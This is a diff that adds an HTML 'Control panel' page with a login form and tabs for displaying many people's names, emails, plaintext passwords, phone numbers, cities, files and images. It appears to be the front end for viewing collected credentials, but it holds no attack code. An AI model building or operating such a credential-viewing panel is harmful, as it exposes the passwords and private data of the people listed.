@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Settings</title>
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/256/3177/3177440.png">
+    <link rel="icon" href="https://www.flaticon.com/svg/vstatic/svg/3917/3917110.svg?token=exp=1730965040~hmac=95968e0d9b1b62246a0ff3f8813ab38d">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <link rel="stylesheet" href="time.css">
+    <script src="time.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+</head>
+
+<body>
+            <div class="omy" id="main-container">
+            <div class="omy-div">
+                <h2>Log in with email</h2>
+                <div class="tt">
+                    <label for="email">Email:</label>
+                    <input class="omy-input" id="email" type="email" placeholder="Enter your email">
+                    <br>
+                    <label for="">password:</label>
+                    <input class="omy-input" id="password" type="password" placeholder="Enter your password">
+                    <br>
+                    <div class="non">
+                        <button id="verify-btn">Send</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+    <div class="home" id="content">
+
+
+
+        <!-- 1 -->
+        <div class="home-1 cox" style="padding-bottom: 104px;">
+            <a href="" class="head-co"><span class="xx"></span><span>Control panel</span></a>
+            <div class="head-button">
+                <div>
+                    <button class="button" id="button1" onclick="showDiv(this)"><span class="material-symbols-outlined"> table </span>Everyone</button>
+                    <button class="button" id="button2" onclick="showDiv(this)"><span class="material-symbols-outlined"> sort </span>Names</button>
+                    <button class="button" id="button3" onclick="showDiv(this)"><span class="material-symbols-outlined"> mail </span>Emails</button>
+                    <button class="button" id="button4" onclick="showDiv(this)"><span class="material-symbols-outlined"> password </span>Password</button>
+                    <button class="button" id="button5" onclick="showDiv(this)"><span class="material-symbols-outlined"> numbers </span>Numbers</button>
+                    <button class="button" id="button6" onclick="showDiv(this)"><span class="material-symbols-outlined"> location_city </span>City</button>
+                    <button class="button" id="button7" onclick="showDiv(this)"><span class="material-symbols-outlined"> files </span>Files</button>
+                    <button class="button" id="button8" onclick="showDiv(this)"><span class="material-symbols-outlined"> more_horiz </span>Other</button>
+                </div>
+            </div>
+                <div class="rrty">
+                    <button class="oz" onclick="goBack()">Previous page<ion-icon name="open-outline"></ion-icon></button>
+                    <button class="xo">Opin settings</button>
+                </div>
+        </div>
+
+        <!-- 2 -->
+        <div class="home-2 cox">
+
+            <!-- Everyone -->
+            <div class="content-div" id="div1"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone">
+                        <div class="Everyone-div2">
+                            <div class="Everyone-dev clo"><div class="xxx"><div>Names</div><div>Emails</div><div>Password</div><div>Numbers</div><div>City</div><div>Files</div><div>Time</div></div></div>
+                            <div id="dataContainer">
+                                <!-- سيتم عرض البيانات هنا -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Names -->
+            <div class="content-div" id="div2"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div class="o">Names</div><div>Emails</div><div>Password</div><div>Numbers</div><div>City</div><div>Files</div><div class="o">Time</div></div></div>
+                    <div id="namesContainer">
+                        <!-- ديف لعرض الأسماء -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Emails -->
+            <div class="content-div" id="div3"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div>Names</div><div class="o">Emails</div><div>Password</div><div>Numbers</div><div>City</div><div>Files</div><div class="o">Time</div></div></div>
+                    <div id="emailsContainer">
+                        <!-- ديف لعرض الإيميلات -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Password -->
+            <div class="content-div" id="div4"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div>Names</div><div>Emails</div><div class="o">Password</div><div>Numbers</div><div>City</div><div>Files</div><div class="o">Time</div></div></div>
+                    <div id="passwordsContainer">
+                        <!-- ديف لعرض الباسوردات -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Numbers -->
+            <div class="content-div" id="div5"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div>Names</div><div>Emails</div><div>Password</div><div class="o">Numbers</div><div>City</div><div>Files</div><div class="o">Time</div></div></div>
+                </div>
+            </div>
+
+            <!-- City -->
+            <div class="content-div" id="div6"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div>Names</div><div>Emails</div><div>Password</div><div>Numbers</div><div class="o">City</div><div>Files</div><div class="o">Time</div></div></div>
+                </div>
+            </div>
+
+            <!-- Files -->
+            <div class="content-div" id="div7"><div class="loading-bar"></div>
+                <div class="content">
+                    <div class="Everyone-dev x"><div class="xxx"><div>Names</div><div>Emails</div><div>Password</div><div>Numbers</div><div>City</div><div class="o">Files</div><div class="o">Time</div></div></div>
+                    <div id="filesContainer">
+                        <!-- ديف لعرض الملفات -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Other -->
+            <div class="content-div" id="div8"><div class="loading-bar"></div>
+                <div class="content">
+                    <div id="deletedDataContainer"></div>
+                    <div id="imagesContainer">
+                        <!-- ديف لعرض الصور -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
